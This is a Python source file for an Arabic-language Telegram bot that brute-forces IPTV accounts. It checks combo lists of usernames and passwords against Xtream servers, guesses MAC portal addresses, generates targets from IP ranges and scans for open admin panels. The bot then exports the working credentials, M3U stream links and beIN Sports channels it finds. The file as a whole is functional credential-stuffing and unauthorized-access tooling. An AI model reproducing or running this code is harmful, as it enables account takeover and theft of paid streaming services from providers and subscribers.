        ar_info  = r.get("arabic_info", {})
        ar_cnt   = ar_info.get("total_arabic", 0)
        ar_pkgs  = ar_info.get("arabic_pkgs", 0)
        ar_cats  = ar_info.get("arabic_cats", [])
        ar_chs   = ar_info.get("arabic_chs", [])
        is_ar_list = ar_info.get("has_arabic_list", False)
        total_ar_ch += ar_cnt

        portal_s = r["portal"].replace("http://", "").replace("https://", "")
        lines += [
            f"┌─ [{idx:03d}] ──────────────────────────────────",
            f"│  🌐  Portal:    {portal_s}",
            f"│  📟  MAC:       {r['mac']}",
            f"│  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━",
            f"│  ✅  الحالة:    {'نشط' if r['is_active'] else 'منتهي'}   📅 {r['exp']}",
            f"│  📋  الباقة:    {r['plan']}",
            f"│  📺  قنوات:     {r['live_count']}   🌙 عربية: {ar_cnt}",
            f"│  📦  باقات ع:  {ar_pkgs}",
        ]
        if is_ar_list:
            lines.append(f"│  🌙  قائمة عربية أصيلة ✅")
        if ar_cats:
            lines.append(f"│  📂  فئات:  {' · '.join(ar_cats[:5])}")
        if ar_chs:
            ch_preview = " · ".join(ar_chs[:6]) + ("…" if ar_cnt > 6 else "")
            lines.append(f"│  📺  عينة:  {ch_preview}")
        lines += [
            f"│  🔗  M3U:   {r.get('m3u_url', '—')}",
            f"└──────────────────────────────────────────",
            "",
        ]
        mac_list.append(r["mac"])
        # M3U — القنوات العربية فقط
        full = r.get("m3u_lines", [])
        if len(full) > 2:
            i = 0
            while i < len(full) - 1:
                line_info = full[i]
                line_url  = full[i + 1] if (i + 1) < len(full) else ""
                if line_info.startswith("#EXTINF"):
                    name_match = re.search(r',(.+)$', line_info)
                    ch_name = name_match.group(1).strip() if name_match else ""
                    if _has_arabic_channel(ch_name):
                        m3u.append(line_info)
                        m3u.append(line_url)
                i += 2
        else:
            m3u += [f"#EXTINF:-1 group-title=\"Arabic MAC\",{r['mac']}", r.get("m3u_url", "")]

    lines += [
        sep,
        f"🌙  إجمالي القنوات العربية:  {total_ar_ch}",
        f"📟  عدد MAC العربية:          {len(arab_r)}",
        sep,
    ]

    await q.answer("📦 جاري تصدير الباقة العربية (MAC)…")
    n = len(arab_r)

    # ملف التقرير
    bio_txt = io.BytesIO("\n".join(lines).encode("utf-8"))
    await q.message.reply_document(
        InputFile(bio_txt, filename=f"arabic_mac_{n}.txt"),
        caption=(
            f"🌙 <b>MAC عربي — تقرير كامل</b>\n"
            f"📟  MAC: <b>{n}</b>\n"
            f"📺  قنوات عربية: <b>{total_ar_ch}</b>\n"
            f"✅  نشط: <b>{sum(1 for r in arab_r if r['is_active'])}</b>"
        ),
        parse_mode=ParseMode.HTML,
    )
    # قائمة MAC
    bio_mac = io.BytesIO("\n".join(mac_list).encode("utf-8"))
    await q.message.reply_document(
        InputFile(bio_mac, filename=f"arabic_mac_list_{n}.txt"),
        caption=f"📟 <b>MAC List — عربي</b>  ({n})",
        parse_mode=ParseMode.HTML,
    )
    # M3U قنوات عربية
    if len(m3u) > 1:
        bio_m3u = io.BytesIO("\n".join(m3u).encode("utf-8"))
        await q.message.reply_document(
            InputFile(bio_m3u, filename=f"arabic_mac_channels_{n}.m3u"),
            caption=f"🌙 <b>M3U MAC عربي</b>  ({len(m3u)//2} قناة)",
            parse_mode=ParseMode.HTML,
        )


async def _export_arabic_pkg_only(q, st: dict):
    """تصدير الحسابات ذات الباقة العربية الصريحة فقط"""
    pkg_r = [r for r in st["results"] + st["mac_results"]
             if r.get("arabic_info", {}).get("has_arabic_pkg")]
    if not pkg_r:
        await q.answer("⚠️ لا توجد باقات عربية صريحة!", show_alert=True); return

    await q.answer(f"📦 {len(pkg_r)} حساب بباقة عربية…")
    sep   = "═" * 50
    lines = [sep, f"📦  باقات عربية صريحة — {BOT_NAME} {VERSION}",
             f"📊  عدد: {len(pkg_r)}", sep, ""]
    for idx, r in enumerate(pkg_r, 1):
        ar_info = r.get("arabic_info", {})
        if r.get("kind") == "mac":
            ident = f"MAC: {r['mac']}  @  {r['portal'].replace('http://','')[:40]}"
        else:
            ident = r.get("xtream_line", "")
        cats = " · ".join(ar_info.get("arabic_cats", [])[:5])
        lines += [
            f"[{idx:03d}]  {ident}",
            f"       📦 فئات: {cats}",
            f"       📺 قنوات عربية: {ar_info.get('total_arabic', 0)}",
            "",
        ]
    bio = io.BytesIO("\n".join(lines).encode("utf-8"))
    await q.message.reply_document(
        InputFile(bio, filename=f"arabic_packages_{len(pkg_r)}.txt"),
        caption=f"📦 <b>باقات عربية صريحة</b>  —  {len(pkg_r)} حساب",
        parse_mode=ParseMode.HTML,
    )


async def _export_arabic_list_only(q, st: dict):
    """تصدير الحسابات ذات القوائم العربية الأصيلة (>20% عربي)"""
    list_r = [r for r in st["results"] + st["mac_results"]
              if r.get("arabic_info", {}).get("has_arabic_list")]
    if not list_r:
        await q.answer("⚠️ لا توجد قوائم عربية أصيلة!", show_alert=True); return

    await q.answer(f"🌙 {len(list_r)} قائمة عربية أصيلة…")
    lines = [f"🌙  قوائم عربية أصيلة — {BOT_NAME} {VERSION}", "═"*50, ""]
    for idx, r in enumerate(list_r, 1):
        ar_info = r.get("arabic_info", {})
        if r.get("kind") == "mac":
            ident = f"📟 MAC: {r['mac']}  /  {r['portal'].replace('http://','')[:38]}"
            link  = r.get("m3u_url", "")
        else:
            ident = f"⚡ {r.get('xtream_line', '')}"
            link  = r.get("m3u_url", "")
        ar_cnt = ar_info.get("total_arabic", 0)
        total  = r.get("live_count", 0)
        pct    = f"{ar_cnt/total*100:.0f}%" if total else "—"
        lines += [
            f"[{idx:03d}]  {ident}",
            f"       📺 {ar_cnt}/{total} عربي ({pct})",
            f"       🔗 {link[:60]}",
            "",
        ]
    bio = io.BytesIO("\n".join(lines).encode("utf-8"))
    await q.message.reply_document(
        InputFile(bio, filename=f"arabic_native_lists_{len(list_r)}.txt"),
        caption=f"🌙 <b>قوائم عربية أصيلة</b>  —  {len(list_r)} قائمة",
        parse_mode=ParseMode.HTML,
    )


async def _export_arabic_mac_from_acc(q, st: dict, idx: int):
    """تصدير الباقة العربية من حساب MAC منفرد"""
    mac_r = st["mac_results"]
    if idx >= len(mac_r):
        await q.answer("⚠️ الحساب غير موجود!", show_alert=True); return
    r       = mac_r[idx]
    ar_info = r.get("arabic_info", {})
    ar_chs  = ar_info.get("arabic_chs", [])
    ar_cnt  = ar_info.get("total_arabic", 0)
    if not ar_cnt:
        await q.answer("⚠️ لا توجد قنوات عربية في هذا الحساب!", show_alert=True); return

    await q.answer("🌙 تصدير الباقة العربية من الحساب…")
    full  = r.get("m3u_lines", [])
    m3u   = ["#EXTM3U"]
    lines = [
        "═" * 50,
        f"🌙  الباقة العربية — {r['mac']}",
        f"📡  Portal: {r['portal'].replace('http://','')[:50]}",
        f"📅  Expiry: {r['exp']}   ✅ {'نشط' if r['is_active'] else 'منتهي'}",
        f"📺  قنوات عربية: {ar_cnt}",
        "═" * 50, "",
    ]
    # استخراج القنوات العربية فقط من M3U
    if len(full) > 2:
        i = 0
        while i < len(full) - 1:
            line_info = full[i]
            line_url  = full[i + 1] if (i + 1) < len(full) else ""
            if line_info.startswith("#EXTINF"):
                name_match = re.search(r',(.+)$', line_info)
                ch_name = name_match.group(1).strip() if name_match else ""
                if _has_arabic_channel(ch_name):
                    m3u.append(line_info)
                    m3u.append(line_url)
                    lines.append(f"  • {ch_name}")
            i += 2
    else:
        for ch in ar_chs:
            lines.append(f"  • {ch}")

    bio_txt = io.BytesIO("\n".join(lines).encode("utf-8"))
    await q.message.reply_document(
        InputFile(bio_txt, filename=f"arabic_pkg_{r['mac'].replace(':','')}.txt"),
        caption=(
            f"🌙 <b>الباقة العربية</b>  📟 <code>{r['mac']}</code>\n"
            f"📺 {ar_cnt} قناة عربية   📅 {r['exp']}"
        ),
        parse_mode=ParseMode.HTML,
    )
    if len(m3u) > 1:
        bio_m3u = io.BytesIO("\n".join(m3u).encode("utf-8"))
        await q.message.reply_document(
            InputFile(bio_m3u, filename=f"arabic_pkg_{r['mac'].replace(':','')}.m3u"),
            caption=f"🌙 <b>M3U عربي</b>  📟 <code>{r['mac']}</code>  ({len(m3u)//2} قناة)",
            parse_mode=ParseMode.HTML,
        )


async def _export_arabic_xtream_from_acc(q, st: dict, idx: int):
    """تصدير الباقة العربية من حساب Xtream منفرد"""
    all_r = st["results"]
    if idx >= len(all_r):
        await q.answer("⚠️ الحساب غير موجود!", show_alert=True); return
    r       = all_r[idx]
    ar_info = r.get("arabic_info", {})
    ar_cnt  = ar_info.get("total_arabic", 0)
    if not ar_cnt:
        await q.answer("⚠️ لا توجد قنوات عربية في هذا الحساب!", show_alert=True); return

    await q.answer("🌙 تصدير الباقة العربية من الحساب…")
    full   = r.get("m3u_lines", [])
    m3u    = ["#EXTM3U"]
    host_s = r["host"].replace("http://", "").replace("https://", "")
    lines  = [
        "═" * 50,
        f"🌙  الباقة العربية — {r['user']}",
        f"🖥  Host: {host_s}",
        f"📅  Expiry: {r['exp']}   ✅ {'نشط' if r['is_active'] else 'منتهي'}",
        f"📺  قنوات عربية: {ar_cnt}",
        f"🔗  Line: {r['xtream_line']}",
        "═" * 50, "",
    ]
    if len(full) > 2:
        i = 0
        while i < len(full) - 1:
            line_info = full[i]
            line_url  = full[i + 1] if (i + 1) < len(full) else ""
            if line_info.startswith("#EXTINF"):
                name_match = re.search(r',(.+)$', line_info)
                ch_name = name_match.group(1).strip() if name_match else ""
                if _has_arabic_channel(ch_name):
                    m3u.append(line_info)
                    m3u.append(line_url)
                    lines.append(f"  • {ch_name}")
            i += 2

    bio_txt = io.BytesIO("\n".join(lines).encode("utf-8"))
    await q.message.reply_document(
        InputFile(bio_txt, filename=f"arabic_xtream_{r['user']}.txt"),
        caption=(
            f"🌙 <b>الباقة العربية</b>  👤 <b>{r['user']}</b>\n"
            f"📺 {ar_cnt} قناة عربية   📅 {r['exp']}"
        ),
        parse_mode=ParseMode.HTML,
    )
    if len(m3u) > 1:
        bio_m3u = io.BytesIO("\n".join(m3u).encode("utf-8"))
        await q.message.reply_document(
            InputFile(bio_m3u, filename=f"arabic_xtream_{r['user']}.m3u"),
            caption=f"🌙 <b>M3U عربي</b>  👤 <b>{r['user']}</b>  ({len(m3u)//2} قناة)",
            parse_mode=ParseMode.HTML,
        )


async def _export_bein(q, st: dict):
    bein_x = [r for r in st["results"]    if r["has_bein"]]
    bein_m = [r for r in st["mac_results"] if r["has_bein"]]
    if not bein_x and not bein_m: await q.answer("⚠️ لا توجد حسابات beIN!", show_alert=True); return
    sep   = "═"*44
    lines = [sep, f"⚽ beIN Sports — {BOT_NAME} {VERSION}",
             f"✅ Xtream: {len(bein_x)}   📡 MAC: {len(bein_m)}", sep, ""]
    m3u   = ["#EXTM3U"]
    if bein_x:
        lines.append("# ── Xtream ──")
        for r in bein_x:
            lines += [f"{r['host']} | {r['user']}:{r['pass']}",
                      f"beIN ({len(r['bein_chs'])}): {', '.join(r['bein_chs'][:5])}",
                      r["xtream_line"], ""]
            full = r.get("m3u_lines",[])
            m3u.extend(full[1:] if len(full)>2 else [f"#EXTINF:-1,{r['user']}", r["m3u_url"]])
    if bein_m:
        lines.append("# ── MAC Portal ──")
        for r in bein_m:
            lines += [f"{r['portal']} | MAC: {r['mac']}",
                      f"beIN ({len(r['bein_chs'])}): {', '.join(r['bein_chs'][:5])}",
                      r.get("m3u_url",""), ""]
    total = len(bein_x)+len(bein_m)
    bio_txt = io.BytesIO("\n".join(lines).encode("utf-8"))
    await q.message.reply_document(InputFile(bio_txt, filename=f"bein_all_{total}.txt"),
        caption=f"⚽ <b>beIN Sports</b>\n🚀 Xtream: <b>{len(bein_x)}</b>  📡 MAC: <b>{len(bein_m)}</b>",
        parse_mode=ParseMode.HTML)
    bio_m3u = io.BytesIO("\n".join(m3u).encode("utf-8"))
    await q.message.reply_document(InputFile(bio_m3u, filename=f"bein_all_{total}.m3u"),
        caption=f"⚽ <b>beIN M3U</b>  ({total} حساب)", parse_mode=ParseMode.HTML)


async def _show_last(q, st: dict):
    all_r = st["results"][-5:]
    if not all_r: await q.answer("⚠️ لا توجد نتائج!", show_alert=True); return
    lines = [f"╔{'═'*34}╗\n║   👁   آخر 5 نتائج   ║\n╚{'═'*34}╝\n"]
    for i, r in enumerate(reversed(all_r), 1):
        hs   = r["host"].replace("http://","")[:32]
        bein = " ⚽" if r["has_bein"] else ""
        unlim= " ♾️" if r.get("is_unlimited") else ""
        lines.append(
            f"<b>#{i}</b>  {'✅' if r['is_active'] else '⚠️'}{bein}{unlim}\n"
            f"🖥  <code>{hs}</code>\n"
            f"👤  <code>{r['user']}:{r['pass']}</code>\n"
            f"📺 {r['live_count']}  🎬 {r['vod_count']}  📅 {r['exp']}\n"
        )
    await safe_edit(q.message, "\n".join(lines), _bk("res:menu"))


async def _export_xtream_m3u(q, st: dict, idx: int):
    all_r = st["results"]
    if idx >= len(all_r): await q.answer("⚠️ الحساب غير موجود!", show_alert=True); return
    r = all_r[idx]; await q.answer("📦 جاري التصدير...")
    full = r.get("m3u_lines",[])
    if len(full) > 2:
        content = "\n".join(full)
        cap = (f"📺 <b>M3U — {r['user']}</b>\n"
               f"📊 Live: <b>{r['live_count']}</b>  VOD: <b>{r['vod_count']}</b>  Series: <b>{r['series_count']}</b>\n"
               f"⚽ beIN: {'✅' if r['has_bein'] else '❌'}  📅 {r['exp']}\n"
               f"♾️ Unlimited: {'✅' if r.get('is_unlimited') else '❌'}")
    else:
        content = f"#EXTM3U\n#EXTINF:-1,{r['user']}\n{r['m3u_url']}\n"
        cap = f"📺 <b>M3U رابط</b>  👤 {r['user']}"
    bio = io.BytesIO(content.encode("utf-8"))
    await q.message.reply_document(InputFile(bio, filename=f"xtream_{r['user'].replace('/','-')}.m3u"),
        caption=cap, parse_mode=ParseMode.HTML)

# ════════════════════════════════════════════════════════════════
#  📋  إدارة الكومبو
# ════════════════════════════════════════════════════════════════
async def do_combo(q, ctx, uid: int, st: dict, act: str):
    match act:
        case "menu":  await _combo_menu(q, st)
        case "add":
            ctx.user_data["w"] = "combo"
            await safe_edit(q.message,
                "📋 <b>إضافة الكومبو</b>\n\nأرسل نصاً أو ملف <code>.txt</code>\n\n"
                "<b>الصيغ المدعومة:</b>\n"
                "<code>user:pass</code>\n<code>user|pass</code>\n<code>http://host:port|user|pass</code>",
                _bk("combo:menu"))
        case "clear":
            st["combo"] = []; await q.answer("🗑 تم"); await _combo_menu(q, st)
        case "dedupe":
            before = len(st["combo"])
            seen, uni = set(), []
            for c in st["combo"]:
                k = f"{c[1]}:{c[2]}"
                if k not in seen: seen.add(k); uni.append(c)
            st["combo"] = uni; await q.answer(f"✅ أُزيل {before - len(uni)} تكرار")
            await _combo_menu(q, st)
        case "shuffle":
            random.shuffle(st["combo"]); await q.answer(f"✅ خُلط {_fmt_num(len(st['combo']))} سطر")
        case "sort_smart":
            st["combo"] = _adaptive.sort_combo_by_priority(st["combo"])
            await q.answer("🧠 تم الترتيب بالأولوية التكيفية")
        case "export":
            if not st["combo"]: await q.answer("⚠️ الكومبو فارغ!", show_alert=True); return
            lines = [f"{h}|{u}|{p}" if h else f"{u}:{p}" for h, u, p in st["combo"]]
            bio   = io.BytesIO("\n".join(lines).encode())
            await q.message.reply_document(InputFile(bio, filename=f"combo_{len(st['combo'])}.txt"),
                caption=f"📋 <b>كومبو</b>  —  {_fmt_num(len(st['combo']))} سطر")


async def _combo_menu(q, st: dict):
    cnt  = len(st["combo"])
    wh   = sum(1 for c in st["combo"] if c[0])
    pct  = f"{wh/cnt*100:.0f}%" if cnt else "—"
    await safe_edit(q.message,
        f"╔{'═'*34}╗\n║   📋   إدارة الكومبو   ║\n╚{'═'*34}╝\n"
        f"\n📊  الإجمالي:     <b>{_fmt_num(cnt)}</b>  سطر\n"
        f"🖥  مع سيرفر:     <b>{_fmt_num(wh)}</b>  ({pct})\n"
        f"👤  بدون سيرفر:  <b>{_fmt_num(cnt-wh)}</b>",
        InlineKeyboardMarkup([
            [InlineKeyboardButton("➕ إضافة كومبو",     callback_data="combo:add"),
             InlineKeyboardButton("💾 تصدير",            callback_data="combo:export")],
            [InlineKeyboardButton("♻️ إزالة تكرار",    callback_data="combo:dedupe"),
             InlineKeyboardButton("🔀 خلط عشوائي",     callback_data="combo:shuffle")],
            [InlineKeyboardButton("🧠 ترتيب تكيفي",    callback_data="combo:sort_smart"),
             InlineKeyboardButton("🗑 مسح الكل",       callback_data="combo:clear")],
            _bkr(),
        ]))

# ════════════════════════════════════════════════════════════════
#  ❓  دليل الاستخدام
# ════════════════════════════════════════════════════════════════
async def _help(q):
    await safe_edit(q.message,
        f"╔{'═'*36}╗\n║   ❓   دليل الاستخدام v22   ║\n╚{'═'*36}╝\n"
        f"\n"
        f"<b>⚡ صيد Xtream:</b>\n"
        f"  1️⃣  حدد السيرفر في ⚙️ الإعدادات\n"
        f"  2️⃣  أضف كومبو من 📋 أو ولّد من ⚡\n"
        f"  3️⃣  اضغط ▶️ بدء الصيد\n"
        f"\n"
        f"<b>🌐 استخراج السيرفرات:</b>\n"
        f"  • جلب تلقائي من مصادر الإنترنت\n"
        f"  • أو كومبو من نطاق IP مخصص\n"
        f"\n"
        f"<b>♾️ تنبيه Unlimited:</b>\n"
        f"  • تنبيه فوري عند اكتشاف حساب غير محدود\n"
        f"\n"
        f"<b>🧠 الصيد التكيفي:</b>\n"
        f"  • البوت يتعلم البادئات الأنجح تلقائياً\n"
        f"  • ترتيب الكومبو بحسب الأولوية المتعلمة\n"
        f"\n"
        f"<b>🛡️ Admin Panel Hunter:</b>\n"
        f"  • كشف لوحات تحكم مفتوحة بدون حماية\n"
        f"  • فحص {len(_ADMIN_PATHS)} مسار معروف\n"
        f"\n"
        f"<b>⏸ الإيقاف المؤقت:</b>\n"
        f"  • حفظ التقدم والاستئناف لاحقاً\n"
        f"\n"
        f"<b>🕐 جدولة الصيد:</b>\n"
        f"  • تشغيل تلقائي في وقت محدد\n"
        f"\n"
        f"<b>📦 الأرشيف التلقائي:</b>\n"
        f"  • أرشفة النتائج القديمة تلقائياً\n"
        f"\n"
        f"<b>📋 صيغ الكومبو:</b>\n"
        f"  <code>user:pass</code>   |   <code>user|pass</code>\n"
        f"  <code>http://host:port|user|pass</code>\n"
        f"\n{_LINE_MID}\n"
        f"🤖  <i>{BOT_NAME}  {VERSION}</i>",
        _bk("main"))

# ════════════════════════════════════════════════════════════════
#  📩  معالج الرسائل
# ════════════════════════════════════════════════════════════════
@admin_only
async def on_msg(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid  = update.effective_user.id
    st   = S(uid)
    text = (update.message.text or "").strip()
    w    = ctx.user_data.get("w")

    async def reply(t, kbd=None):
        await update.message.reply_text(t, parse_mode=ParseMode.HTML, reply_markup=kbd,
                                        disable_web_page_preview=True)

    match w:
        case "server":
            h = text if text.startswith("http") else "http://"+text
            st["server"] = h; ctx.user_data.pop("w")
            await reply(f"✅ <b>تم تعيين السيرفر:</b>\n<code>{h}</code>",
                InlineKeyboardMarkup([[InlineKeyboardButton("⚙️ الإعدادات", callback_data="cfg:menu")]]))

        case "mac_portal":
            h = text if text.startswith("http") else "http://"+text
            st["mac_portal"] = h; ctx.user_data.pop("w")
            await reply(
                f"✅ <b>تم تعيين البوابة:</b>\n<code>{h}</code>\n"
                f"📊 إجمالي: <b>{len(_portals(st))}</b>",
                InlineKeyboardMarkup([[
                    InlineKeyboardButton("📡 MAC Hunter",     callback_data="mac:menu"),
                    InlineKeyboardButton("🔀 إدارة البوابات", callback_data="mac:portals_menu"),
                ]]))

        case "mac_add_portal":
            lines_ = [x.strip() for x in text.splitlines() if x.strip()]
            added  = []
            for ln in lines_:
                h = ln if ln.startswith("http") else "http://"+ln
                if h not in st["mac_portals"] and h != st["mac_portal"]:
                    st["mac_portals"].append(h); added.append(h)
            ctx.user_data.pop("w")
            txt_ = f"✅ <b>أُضيفت {len(added)} بوابة</b>\n"
            for h in added[:5]: txt_ += f"  • <code>{h[:55]}</code>\n"
            txt_ += f"📊 الإجمالي: <b>{len(_portals(st))}</b>"
            await reply(txt_, InlineKeyboardMarkup([[
                InlineKeyboardButton("🔀 إدارة البوابات", callback_data="mac:portals_menu"),
                InlineKeyboardButton("🚀 بدء الصيد",      callback_data="mac:start"),
            ]]))

        case "mac_count":
            try:
                v = max(100, min(int(text), 500_000)); st["mac_count"] = v
                ctx.user_data.pop("w")
                await reply(f"✅ عدد MAC: <b>{_fmt_num(v)}</b>",
                    InlineKeyboardMarkup([[InlineKeyboardButton("📡 MAC Hunter", callback_data="mac:menu")]]))
            except ValueError: await reply("⚠️ أرسل رقماً (100 – 500,000)")

        case "mac_threads":
            try:
                v = max(5, min(int(text), 100)); st["mac_threads"] = v
                ctx.user_data.pop("w")
                await reply(f"✅ خيوط MAC: <b>{v}</b>",
                    InlineKeyboardMarkup([[InlineKeyboardButton("📡 MAC Hunter", callback_data="mac:menu")]]))
            except ValueError: await reply("⚠️ أرسل رقماً (5 – 100)")

        case "mac_single": ctx.user_data.pop("w"); await _mac_single(update, ctx, uid, st, text)

        case "multi_srv":
            h = text if text.startswith("http") else "http://"+text
            if h not in st["multi_servers"]: st["multi_servers"].append(h)
            ctx.user_data.pop("w")
            await reply(
                f"✅ أُضيف: <code>{h}</code>  ({len(st['multi_servers'])} إضافي)",
                InlineKeyboardMarkup([[InlineKeyboardButton("⚙️ الإعدادات", callback_data="cfg:menu")]]))

        case "threads":
            try:
                v = max(1, min(int(text), 300)); st["threads"] = v
                ctx.user_data.pop("w")
                await reply(f"✅ الخيوط: <b>{v}</b>",
                    InlineKeyboardMarkup([[InlineKeyboardButton("⚙️ الإعدادات", callback_data="cfg:menu")]]))
            except ValueError: await reply("⚠️ أرسل رقماً (1 – 300)")

        case "timeout":
            try:
                v = max(2, min(int(text), 30)); st["timeout"] = v
                ctx.user_data.pop("w")
                await reply(f"✅ المهلة: <b>{v}s</b>",
                    InlineKeyboardMarkup([[InlineKeyboardButton("⚙️ الإعدادات", callback_data="cfg:menu")]]))
            except ValueError: await reply("⚠️ أرسل رقماً (2 – 30)")

        case "retry":
            try:
                v = max(1, min(int(text), 3)); st["retry"] = v
                ctx.user_data.pop("w")
                await reply(f"✅ المحاولات: <b>{v}</b>",
                    InlineKeyboardMarkup([[InlineKeyboardButton("⚙️ الإعدادات", callback_data="cfg:menu")]]))
            except ValueError: await reply("⚠️ أرسل رقماً (1 – 3)")

        case "combo":
            parsed, total_lines, dupes = load_combo(text)
            if parsed:
                st["combo"].extend(parsed); ctx.user_data.pop("w")
                await reply(
                    f"✅ <b>أُضيف {_fmt_num(len(parsed))} سطر</b>\n"
                    f"♻️ تكرارات: {dupes}   📊 الإجمالي: <b>{_fmt_num(len(st['combo']))}</b>",
                    InlineKeyboardMarkup([[
                        InlineKeyboardButton("📋 الكومبو", callback_data="combo:menu"),
                        InlineKeyboardButton("🚀 الصيد",  callback_data="hunt:menu"),
                    ]]))
            else:
                await reply("⚠️ لم يُعرف أي سطر صالح!\n<code>user:pass</code>  أو  <code>user|pass</code>")

        case "health_add":
            h = text if text.startswith("http") else "http://"+text
            st["health"][h] = {"status":"wait","ms":0,"checks":0,"up":0}
            ctx.user_data.pop("w")
            await reply(f"✅ أُضيف: <code>{h}</code>",
                InlineKeyboardMarkup([[InlineKeyboardButton("🏥 المراقبة", callback_data="hlth:menu")]]))

        case "single": ctx.user_data.pop("w"); await _single_check(update, ctx, uid, st, text)

        case "ip_range":
            ctx.user_data.pop("w")
            await reply("⏳ <b>جاري توليد الكومبو من IP Range…</b>")
            try:
                combo = generate_combo_from_ip_range(text)
                if not combo:
                    await reply("⚠️ نطاق IP غير صالح! مثال: <code>192.168.1.0/24</code>"); return
                st["combo"].extend(combo)
                await reply(
                    f"✅ <b>تم توليد {_fmt_num(len(combo))} كومبو من IP Range</b>\n"
                    f"🌐 النطاق: <code>{text}</code>\n"
                    f"📊 الإجمالي: <b>{_fmt_num(len(st['combo']))}</b>",
                    InlineKeyboardMarkup([[
                        InlineKeyboardButton("📋 الكومبو", callback_data="combo:menu"),
                        InlineKeyboardButton("🚀 الصيد",   callback_data="hunt:menu"),
                    ]]))
            except Exception as e:
                await reply(f"❌ خطأ: {e}")

        case "sched_time":
            ctx.user_data.pop("w")
            try:
                h, m = map(int, text.strip().split(":"))
                now = datetime.now()
                sched_dt = now.replace(hour=h, minute=m, second=0, microsecond=0)
                if sched_dt <= now:
                    sched_dt += timedelta(days=1)
                if uid not in _SCHEDULED:
                    _SCHEDULED[uid] = {}
                _SCHEDULED[uid]["time"] = sched_dt
                _SCHEDULED[uid]["triggered"] = False
                await reply(
                    f"✅ <b>تم ضبط الجدولة:</b>\n"
                    f"🕐 {sched_dt.strftime('%H:%M — %Y/%m/%d')}\n"
                    f"💡 فعّل الجدولة من قائمة الجدولة",
                    InlineKeyboardMarkup([[InlineKeyboardButton("🕐 الجدولة", callback_data="sched:menu")]]))
            except Exception:
                await reply("⚠️ الصيغة خاطئة! مثال: <code>22:30</code>")

        case "adm_custom":
            ctx.user_data.pop("w")
            h = text if text.startswith("http") else "http://"+text
            await reply(f"🔍 <b>جاري فحص Admin Panel…</b>\n🌐 <code>{h}</code>")
            try:
                connector = aiohttp.TCPConnector(ssl=False, limit=10)
                async with aiohttp.ClientSession(connector=connector,
                    headers={"User-Agent": _rand_ua()}) as sess:
                    result = await detect_admin_panel(sess, h, st["timeout"])
                if result["found"]:
                    paths_txt = ""
                    for p in result["paths_found"][:5]:
                        open_tag = " 🔓 OPEN" if p["open"] else ""
                        paths_txt += f"\n  • <code>{p['url'][:55]}</code>{open_tag}"
                    await reply(
                        f"🛡️ <b>لوحة تحكم مُكتشفة!</b>\n"
                        f"🌐 <code>{h.replace('http://','')[:40]}</code>\n"
                        f"📋 {result['title'][:40]}\n"
                        f"🔓 مفتوح: {'✅ نعم!' if result['open'] else '❌ لا'}\n"
                        f"📍 المسارات:{paths_txt}",
                        InlineKeyboardMarkup([[InlineKeyboardButton("🛡️ Admin Hunter", callback_data="adm:menu")]]))
                else:
                    await reply(
                        f"❌ <b>لم تُكتشف لوحة تحكم</b>\n🌐 <code>{h.replace('http://','')[:40]}</code>",
                        InlineKeyboardMarkup([[InlineKeyboardButton("🛡️ رجوع", callback_data="adm:menu")]]))
            except Exception as e:
                await reply(f"❌ خطأ: {e}")

        case _:
            parsed, _, dupes = load_combo(text)
            if parsed:
                st["combo"].extend(parsed)
                await reply(
                    f"✅ <b>أُضيف {_fmt_num(len(parsed))} سطر للكومبو</b>\n"
                    f"📊 الإجمالي: <b>{_fmt_num(len(st['combo']))}</b>",
                    InlineKeyboardMarkup([[
                        InlineKeyboardButton("📋 الكومبو", callback_data="combo:menu"),
                        InlineKeyboardButton("🚀 الصيد",  callback_data="hunt:menu"),
                    ]]))
            else:
                await reply("🤖 اضغط /start لفتح القائمة\nأو أرسل كومبو مباشرةً.")

# ════════════════════════════════════════════════════════════════
#  📎  معالج الملفات
# ════════════════════════════════════════════════════════════════
@admin_only
async def on_doc(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    st  = S(uid)
    doc = update.message.document
    if not doc: return
    await update.message.reply_chat_action(ChatAction.TYPING)
    try:
        f   = await ctx.bot.get_file(doc.file_id)
        bio = io.BytesIO()
        await f.download_to_memory(bio)
        bio.seek(0)
        text = bio.read().decode("utf-8", errors="ignore")
    except Exception as e:
        await update.message.reply_text(f"⚠️ خطأ في قراءة الملف: {e}"); return
    ctx.user_data.pop("w", None)
    parsed, total_lines, dupes = load_combo(text)
    if not parsed:
        await update.message.reply_text(
            f"⚠️ لا يحتوي كومبو صالح\n📄 عدد الأسطر: {total_lines}"); return
    st["combo"].extend(parsed)
    await update.message.reply_text(
        f"✅ <b>تم تحميل الملف</b>\n"
        f"📋  صالح:    <b>{_fmt_num(len(parsed))}</b> / {_fmt_num(total_lines)}\n"
        f"♻️  تكرارات: <b>{dupes}</b>\n"
        f"📊  الإجمالي: <b>{_fmt_num(len(st['combo']))}</b>",
        parse_mode=ParseMode.HTML,
        reply_markup=InlineKeyboardMarkup([[
            InlineKeyboardButton("📋 الكومبو", callback_data="combo:menu"),
            InlineKeyboardButton("🚀 الصيد",  callback_data="hunt:menu"),
        ]]))

# ════════════════════════════════════════════════════════════════
#  🚀  نقطة الانطلاق — Python 3.14 safe
# ════════════════════════════════════════════════════════════════
# الحل الجذري لـ Python 3.14:
#   - نُنشئ event loop يدوياً ونُشغّله بـ loop.run_until_complete
#   - نتجنب asyncio.run() تماماً (يُنشئ loop جديد ويكسر PTB)
#   - نتجنب app.run_polling() المتزامن (يستدعي loop.run_until_complete داخلياً)
#   - نستخدم app.initialize() + app.start() + updater.start_polling() + idle
# ════════════════════════════════════════════════════════════════

async def _bot_main() -> None:
    """تشغيل البوت بالكامل داخل loop واحد — Python 3.14 safe"""

    if not BOT_TOKEN or BOT_TOKEN == "YOUR_BOT_TOKEN_HERE":
        print("❌ خطأ: يرجى تعيين BOT_TOKEN في ملف .env")
        sys.exit(1)

    print(
        f"\n╔{'═'*54}╗\n"
        f"║   🎯   {BOT_NAME}   {VERSION}                      ║\n"
        f"║   📡   MAC Portal + Xtream + Admin Hunter          ║\n"
        f"║   🧠   Adaptive + Archive + Schedule + Parallel    ║\n"
        f"║   🐍   Python {sys.version.split()[0]}                                  ║\n"
        f"╚{'═'*54}╝\n"
        f"✅  Token  : {BOT_TOKEN[:24]}…\n"
        f"✅  Admins : {ADMIN_IDS}\n"
        f"🔄  جاري الاتصال بـ Telegram…\n"
    )

    app = (
        Application.builder()
        .token(BOT_TOKEN)
        .concurrent_updates(True)
        .read_timeout(30)
        .write_timeout(30)
        .connect_timeout(30)
